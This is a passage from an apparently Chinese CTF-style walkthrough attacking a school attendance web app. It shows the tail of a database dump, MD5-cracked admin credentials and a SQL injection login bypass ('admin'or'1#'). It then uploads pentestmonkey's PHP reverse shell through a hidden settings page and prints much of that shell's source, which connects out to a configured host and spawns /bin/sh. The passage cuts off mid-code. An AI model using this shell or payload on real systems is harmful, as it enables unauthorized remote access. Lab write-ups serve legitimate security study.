string">`</span></span></pre></td></tr><tr><td data-num="299"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="300"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="301"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="302"></td><td><pre></pre></td></tr><tr><td data-num="303"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="304"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="305"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="306"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="307"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="308"></td><td><pre></pre></td></tr><tr><td data-num="309"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="310"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> dumped tables</pre></td></tr><tr><td data-num="311"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="312"></td><td><pre></pre></td></tr><tr><td data-num="313"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="314"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="315"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="316"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="317"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="318"></td><td><pre></pre></td></tr><tr><td data-num="319"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="320"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="321"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="322"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="323"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="324"></td><td><pre></pre></td></tr><tr><td data-num="325"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="326"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="327"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="328"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="329"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="330"></td><td><pre></pre></td></tr><tr><td data-num="331"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="332"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="333"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="334"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="335"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="336"></td><td><pre></pre></td></tr><tr><td data-num="337"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="338"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="339"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="340"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="341"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="342"></td><td><pre></pre></td></tr><tr><td data-num="343"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="344"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="345"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="346"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="347"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="348"></td><td><pre></pre></td></tr><tr><td data-num="349"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="350"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="351"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="352"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="353"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="354"></td><td><pre></pre></td></tr><tr><td data-num="355"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="356"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="357"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="358"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="359"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="360"></td><td><pre></pre></td></tr><tr><td data-num="361"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="362"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="363"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="364"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="365"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="366"></td><td><pre></pre></td></tr><tr><td data-num="367"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="368"></td><td><pre><span class="token operator">--</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="369"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="370"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="371"></td><td><pre>  <span class="token constant">MODIFY</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="372"></td><td><pre><span class="token constant">COMMIT</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="373"></td><td><pre></pre></td></tr><tr><td data-num="374"></td><td><pre><span class="token comment">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="375"></td><td><pre><span class="token comment">/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="376"></td><td><pre><span class="token comment">/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>不难发现我们想要的用户名和密码：</p>
<p>进行 md5 解密</p>
<p>得到 admin 的密码为：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011224218652-1849272615.png" alt="" /></p>
<p>jsmith@sample.com 的密码为：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011224232722-1726087958.png" alt="" /></p>
<p>使用 admin 登录，登录成功得到页面：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011224249391-125136219.png" alt="" /></p>
<p>PS：这里的登录框存在 sql 注入，也可以使用万能密码 admin'or'1# 直接登录</p>
<p>右击检查网页源代码，这里给了一个 shell 路径，但是访问发现并不存在</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011224306044-1185131377.png" alt="" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011224322312-1073803224.png" alt="" /></p>
<p>往下发现一个注释掉的页面，访问发现可以上传文件</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string double-quoted-string">"index.php?page=site_settings"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"nav-item nav-site_settings"</span><span class="token operator">></span><span class="token operator">&lt;</span>span <span class="token keyword">class</span><span class="token operator">=</span><span class="token string single-quoted-string">'icon-field'</span><span class="token operator">></span><span class="token operator">&lt;</span>i <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"fa fa-cogs text-danger"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>i<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span> System Settings<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span> <span class="token operator">--</span><span class="token operator">></span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011224343329-880955792.png" alt="" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011224357281-1299366159.png" alt="" /></p>
<p>上传一个 php-reverse-shell.php 文件，成功上传 php 文件，但是并没有返回保存路径</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">// for any actions performed using this tool.  The author accepts no liability</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">// do not use this tool.</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">// In all other respects the GPL version 2 applies:</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">// This program is free software; you can redistribute it and/or modify</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">// it under the terms of the GNU General Public License version 2 as</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// published by the Free Software Foundation.</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token comment">// This program is distributed in the hope that it will be useful,</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token comment">// GNU General Public License for more details.</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token comment">// You should have received a copy of the GNU General Public License along</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token comment">// for any actions performed using this tool.  If these terms are not acceptable to</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token comment">// you, then do not use this tool.</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token comment">// You are encouraged to send comments, improvements or suggestions to</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token comment">// me at pentestmonkey@pentestmonkey.net</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token comment">// Description</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token comment">// -----------</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token comment">// The recipient will be given a shell running as the current user (apache normally).</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment">// Limitations</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token comment">// -----------</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token comment">// Usage</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token comment">// -----</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token function">set_time_limit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token variable">$VERSION</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1.0"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">;</span>  <span class="token comment">// CHANGE THIS</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span>       <span class="token comment">// CHANGE THIS</span></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token variable">$chunk_size</span> <span class="token operator">=</span> <span class="token number">1400</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token variable">$write_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token variable">$error_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uname -a; w; id; /bin/sh -i'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token variable">$debug</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token comment">// Daemonise ourself if possible to avoid zombies later</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token comment">// our php process and avoid zombies.  Worth a try...</span></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pcntl_fork'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>	<span class="token comment">// Fork and have the parent process exit</span></pre></td></tr><tr><td data-num="66"></td><td><pre>	<span class="token variable">$pid</span> <span class="token operator">=</span> <span class="token function">pcntl_fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>	</pre></td></tr><tr><td data-num="68"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't fork"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>	</pre></td></tr><tr><td data-num="73"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Parent exits</span></pre></td></tr><tr><td data-num="75"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="76"></td><td><pre></pre></td></tr><tr><td data-num="77"></td><td><pre>	<span class="token comment">// Make the current process a session leader</span></pre></td></tr><tr><td data-num="78"></td><td><pre>	<span class="token comment">// Will only succeed if we forked</span></pre></td></tr><tr><td data-num="79"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">posix_setsid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error: Can't setsid()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="83"></td><td><pre></pre></td></tr><tr><td data-num="84"></td><td><pre>	<span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="85"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="87"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="88"></td><td><pre></pre></td></tr><tr><td data-num="89"></td><td><pre><span class="token comment">// Change to a safe directory</span></pre></td></tr><tr><td data-num="90"></td><td><pre><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="91"></td><td><pre></pre></td></tr><tr><td data-num="92"></td><td><pre><span class="token comment">// Remove any umask we inherited</span></pre></td></tr><tr><td data-num="93"></td><td><pre><span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="94"></td><td><pre></pre></td></tr><tr><td data-num="95"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="96"></td><td><pre><span class="token comment">// Do the reverse shell...</span></pre></td></tr><tr><td data-num="97"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="98"></td><td><pre></pre></td></tr><tr><td data-num="99"></td><td><pre><span class="token comment">// Open reverse connection</span></pre></td></tr><tr><td data-num="100"></td><td><pre><span class="token variable">$sock</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="101"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="102"></td><td><pre>	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (<span class="token interpolation"><span class="token variable">$errno</span></span>)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td 